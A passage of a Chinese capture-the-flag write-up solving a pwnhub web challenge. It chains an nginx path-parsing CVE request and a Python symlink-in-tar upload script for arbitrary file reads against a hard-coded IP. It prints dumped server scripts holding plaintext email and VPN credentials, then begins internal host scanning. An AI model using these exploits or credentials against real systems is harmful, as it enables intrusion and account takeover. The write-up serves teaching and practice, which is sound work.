bwsp&gt;</div><div class="line">&lt;admin vSrn&gt;</div><div class="line">&lt;config Iloc&gt;</div><div class="line">&lt;config bwsp&gt;</div><div class="line">&lt;config vSrn&gt;</div><div class="line">&lt;includes Iloc&gt;</div><div class="line">&lt;includes bwsp&gt;</div><div class="line">&lt;includes vSrn&gt;</div><div class="line">&lt;index.html Iloc&gt;</div><div class="line">&lt;index.php Iloc&gt;</div><div class="line">&lt;index.php ptbL&gt;</div><div class="line">&lt;index.php ptbN&gt;</div><div class="line">&lt;pwnhub Iloc&gt;</div><div class="line">&lt;pwnhub bwsp&gt;</div><div class="line">&lt;pwnhub vSrn&gt;</div><div class="line">&lt;upload  Iloc&gt;</div><div class="line">&lt;upload  bwsp&gt;</div><div class="line">&lt;upload  vSrn&gt;</div></pre></td></tr></table></figure>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>根据提示：<code>2017.10.02 15:45:49Nginx 虽然有过很多问题，但是它是个好 server</code></p>
<p>猜测应该是利用一个NGINX的CVE</p>
<p>然后在上一步发现一个奇怪的地方，最后一个是<code>uploap[space]</code> 目录而不是<code>uploap</code>目录，有一个空格。</p>
<p>根据这些信息，搜到一个CVE，编号是<a href="https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547" target="_blank" rel="external">CVE-2013-4547</a></p>
<p>….题目关了，搞不到图了。</p>
<p>payload是：<code>GET upload /../pwnhub/ HTTP/1.1</code></p>
<p>这里不能使用浏览器，因为浏览器会把这url变成<code>/pwnhub/</code></p>
<p>得到一个路径：<code>6c58c8751bca32b9943b34d0ff29bc16/index.php</code></p>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><code>6c58c8751bca32b9943b34d0ff29bc16/index.php</code>是一个文件上传的服务</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>你在里面发现了什么? <span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>注意：只支持tar!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>更新配置成功，内容如下<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"30"</span> <span class="attr">rows</span>=<span class="string">"15"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>一开始尝试上传各种文件，都能成功，但是配置更新成功并没有显示任何内容，包括上传tar文件，懵逼了一会。。。</p>
<p>然后发现，这个目录也有<code>.DS_Store</code>泄露：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> DSStore.open(<span class="string">"DS_Store"</span>, <span class="string">"r+"</span>) <span class="keyword">as</span> f:</div><div class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line"><span class="meta">... </span>        <span class="keyword">print</span> <span class="string">"|%s|"</span>%i.filename</div><div class="line">|index.php|</div><div class="line">|untar.py|</div></pre></td></tr></table></figure>
<p>有一个untar.py文件：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> tarfile</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">untar</span><span class="params">(filename)</span>:</span></div><div class="line">    os.chdir(<span class="string">'/tmp/pwnhub/'</span>)</div><div class="line">    t = tarfile.open(filename, <span class="string">'r'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t.getnames():</div><div class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">'.cfg'</span> != os.path.splitext(i)[<span class="number">1</span>]:</div><div class="line">            <span class="keyword">return</span> <span class="string">'error'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                t.extract(i, <span class="string">'/tmp/pwnhub/'</span>)</div><div class="line">            <span class="keyword">except</span> Exception, e:</div><div class="line">                <span class="keyword">return</span> e</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                cfgName = str(uuid.uuid1()) + <span class="string">'.cfg'</span></div><div class="line">                os.rename(i, cfgName)</div><div class="line">                <span class="keyword">return</span> cfgName</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    filename = sys.argv[<span class="number">1</span>]</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tarfile.is_tarfile(filename):</div><div class="line">        exit(<span class="string">'error'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> untar(filename)</div></pre></td></tr></table></figure>
<p>很明显了，要压缩一个cfg文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"fjwopqafjasdo"</span> &gt; /tmp/test.cfg</span></div><div class="line"><span class="meta">$</span><span class="bash"> tar cf /tmp/test.tar /tmp/test.cfg</span></div></pre></td></tr></table></figure>
<p>然后上传test.tar，更新配置成功后终于成功返回内容了。</p>
<p>但是该怎么利用又卡住了，然后看到hint：<code>2017.10.03 11:24:40想办法把它变成任意文件读取，但 Flag 不在这儿 ，当作一次真实渗透玩吧！</code></p>
<p>想到了软链接，PoC如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></div><div class="line">	url = <span class="string">"http://54.223.177.152/6c58c8751bca32b9943b34d0ff29bc16/index.php"</span></div><div class="line">	files = &#123;<span class="string">"upload"</span>: (<span class="string">"test.tar"</span>, open(<span class="string">"/tmp/test.tar"</span>, <span class="string">"rb"</span>), <span class="string">"application/x-tar"</span>)&#125;</div><div class="line">	r = requests.post(url, files=files)</div><div class="line">	data = r.content</div><div class="line">	<span class="comment"># html = BeautifulSoup(data, "lxml")</span></div><div class="line">	<span class="comment"># print html.textarea.contents[0]</span></div><div class="line">	<span class="keyword">print</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	filename = sys.argv[<span class="number">1</span>]</div><div class="line">	<span class="keyword">print</span> filename</div><div class="line">	os.system(<span class="string">"ln -sf %s /tmp/test.cfg"</span>%filename)</div><div class="line">	os.system(<span class="string">"tar cf /tmp/test.tar /tmp/test.cfg"</span>)</div><div class="line">	upload()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>到了任意文件读取的步骤了，然后各种文件读读，照例我都会读读<code>/proc/self</code>下的文件，然后发现：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python 2013_read_file.py /proc/self/mountinfo</span></div><div class="line"></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;181 103 0:40 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay/a67f9242dc6db4569b299d14ce4308f2f63624e8387569cbe015cbc973e50a0c/root,upperdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/upper,workdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/work</div><div class="line">182 181 0:43 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw</div><div class="line">238 181 0:44 / /dev rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">239 238 0:45 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666</div><div class="line">240 181 0:46 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro</div><div class="line">241 240 0:47 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,mode=755</div><div class="line">242 241 0:22 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/systemd ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd</div><div class="line">243 241 0:24 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/blkio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,blkio</div><div class="line">244 241 0:25 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/perf_event ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,perf_event</div><div class="line">245 241 0:26 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpu,cpuacct ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpu,cpuacct</div><div class="line">246 241 0:27 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/pids ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,pids</div><div class="line">247 241 0:28 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/freezer ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,freezer</div><div class="line">248 241 0:29 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/net_cls,net_prio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,net_cls,net_prio</div><div class="line">249 241 0:30 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/memory ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,memory</div><div class="line">250 241 0:31 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpuset ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpuset</div><div class="line">251 241 0:32 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/hugetlb ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,hugetlb</div><div class="line">252 241 0:33 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/devices ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,devices</div><div class="line">253 238 0:42 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw</div><div class="line">254 181 202:1 /home/ubuntu/Nginx_1.4.2/crontab /etc/crontab rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">255 181 202:1 /home/ubuntu/Nginx_1.4.2/pwnhub /tmp/pwnhub rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">256 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">257 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/hostname /etc/hostname rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">258 181 202:1 /var/lib/docker/containers/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23/hosts /etc/hosts rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">259 238 0:41 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k</div><div class="line">260 181 202:1 /home/ubuntu/Nginx_1.4.2/html /usr/local/nginx/html rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">261 238 202:1 /home/ubuntu/Nginx_1.4.2/access.log /dev/stdout rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">262 181 202:1 /home/ubuntu/Nginx_1.4.2/run /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">263 181 202:1 /home/ubuntu/Nginx_1.4.2/nginx.conf /usr/local/nginx/conf/nginx.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">264 181 202:1 /home/ubuntu/Nginx_1.4.2/cron_run.sh /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">419 181 202:1 /home/ubuntu/Nginx_1.4.2/www.conf /etc/php5/fpm/pool.d/www.conf rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered</div><div class="line">104 238 0:45 /0 /dev/console rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666</div><div class="line">107 182 0:43 /bus /proc/bus ro,relatime - proc proc rw</div><div class="line">108 182 0:43 /fs /proc/fs ro,relatime - proc proc rw</div><div class="line">109 182 0:43 /irq /proc/irq ro,relatime - proc proc rw</div><div class="line">110 182 0:43 /sys /proc/sys ro,relatime - proc proc rw</div><div class="line">111 182 0:43 /sysrq-trigger /proc/sysrq-trigger ro,relatime - proc proc rw</div><div class="line">112 182 0:44 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">113 182 0:44 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">114 182 0:44 /null /proc/timer_stats rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">115 182 0:44 /null /proc/sched_debug rw,nosuid - tmpfs tmpfs rw,mode=755</div><div class="line">132 240 0:48 / /sys/firmware ro,relatime - tmpfs tmpfs ro</div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>发现一个脚本：<code>/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh</span></div><div class="line">/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh</div><div class="line">tar: Removing leading `/' from member names</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;#\!/bin/bash</div><div class="line"></div><div class="line">cd /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/ &amp;&amp; python run.py</div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta"></span></div><div class="line">$<span class="bash"> python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run.py </span></div><div class="line">/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run.py</div><div class="line">tar: Removing leading `/' from member names</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;#encoding=utf8</div><div class="line"></div><div class="line">from collections import Counter</div><div class="line">from mail_send import send_mail</div><div class="line"></div><div class="line">ip = []</div><div class="line">statusCode = []</div><div class="line"></div><div class="line">def toDeal(filename):</div><div class="line">    with open(filename, 'r') as f:</div><div class="line">        logs = f.readlines()</div><div class="line">        for log in logs:</div><div class="line">            ip.append(log.split()[0])</div><div class="line">            statusCode.append(log.split()[8])</div><div class="line"></div><div class="line">    logAll = '日志总数：' + str(len(logs))</div><div class="line">    ipUV = '独立 IP：' + str(list(set(ip)))</div><div class="line">    ipNumber = 'IP出现次数：' + str(dict(Counter(ip)))</div><div class="line">    codeNumber = '状态码出现次数：' + str(dict(Counter(statusCode)))</div><div class="line">    content = logAll + '\n' + ipUV + '\n' + ipNumber + '\n' + codeNumber</div><div class="line">    send_mail('Pwnhub Nginx Report', content)</div><div class="line"></div><div class="line">if __name__ == '__main__':</div><div class="line">    toDeal('/usr/local/var/log/nginx/access.log')</div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta"></span></div><div class="line">$<span class="bash"> python 2013_read_file.py /home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py</span></div><div class="line">/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py</div><div class="line">tar: Removing leading `/' from member names</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;你在里面发现了什么? &lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action="index.php" method="post" enctype="multipart/form-data"&gt;</div><div class="line">&lt;input name="upload" type="file" /&gt;&lt;br/&gt;</div><div class="line">&lt;input type="submit" value="上传" /&gt;</div><div class="line">&lt;p&gt;注意：只支持tar!!&lt;/p&gt;</div><div class="line">&lt;p&gt;更新配置成功，内容如下&lt;/p&gt;&lt;textarea cols="30" rows="15"&gt;#coding:utf-8</div><div class="line"></div><div class="line">import smtplib</div><div class="line">from email.mime.text import MIMEText</div><div class="line"></div><div class="line">mail_user = 'ctf_dicha@21cn.com'</div><div class="line">mail_pass = '634DRaC62ehWK6X'</div><div class="line">mail_server = 'smtp.21cn.com'</div><div class="line">mail_port = 465</div><div class="line">to_user = 'wyd0n9@gmail.com'</div><div class="line"></div><div class="line">def send_mail(title,content):</div><div class="line">    #创建一个实例，这里设置为html格式邮件</div><div class="line">    msg = MIMEText(content, _subtype = 'html', _charset = 'utf-8')</div><div class="line">    msg['Subject'] = title</div><div class="line">    msg['From'] = mail_user</div><div class="line">    msg['To'] = to_user</div><div class="line">    try:</div><div class="line">        #登录smtp服务器</div><div class="line">        server = smtplib.SMTP_SSL(mail_server,mail_port)</div><div class="line">        server.login(mail_user,mail_pass)</div><div class="line">        #邮件发送</div><div class="line">        server.sendmail(mail_user,to_user,msg.as_string())</div><div class="line">        server.quit()</div><div class="line">        return True</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return False</div><div class="line">    </div><div class="line">    </div><div class="line">&lt;/textarea&gt;&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>得到一个邮箱，然后尝试去登录看看，然后在收件箱看到一个发送vpn邮箱发送失败的返回邮件，然后去发件箱得到一个vpn:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">IPsec VPN server is now ready for use!</div><div class="line"></div><div class="line"></div><div class="line">Connect to your new VPN with these details:</div><div class="line"></div><div class="line"></div><div class="line">Server IP: 54.223.177.152</div><div class="line">IPsec PSK: dkQ97gGQPuVm833Ed2F9</div><div class="line">Username: pwnhub</div><div class="line">Password: LE3U2aTgc4DGZd92wg82</div><div class="line"></div><div class="line"></div><div class="line">Write these down. You&apos;ll need them to connect!</div></pre></td></tr></table></figure>
<p>这里想找个linux图形界面连IPsec的软件，但没找到，还是切换到Mac了。。</p>
<p>VPN连上后应该就是内网找服务了，因为nmap探测的很慢，所以只探测80端口</p>
<p>咸鱼了一会后发现几台主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">172.17.0.1</div><div class="line">172.17.0.3</div><div class="line">172.17.0.5</div><div class="line">172.17.0.7</div><div class="line">172.17.0.9</div></pre></td></tr></table></figure>
<p>从这可以看出来这是一个docker，其中1是外网那个服务的容器，其他80端口都是nginx默认端口，然后扫描3发现还开了8090，根据之后的提示：<code>搞 Discuz 不是目的，谁说鸡肋就没用，看 Discuz 送助攻</code></p>
<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>8090端口开的就是一个dz x3.2服务，然后就知道是搞这个了，找了下dz的漏洞去尝试，发现只有ssrf，有最新的任意文件删除的是有效的。</p>
<p>然后发现自己太菜了，根本不会做web，日不动dz。。。。。。</p>
<p>然后偶然间发现。。。。80端口变了，竟然不是默认的nginx服务了, 是一个跳转到<code>index.php</code>的html页面，<code>index.php</code>页面如下：</p>
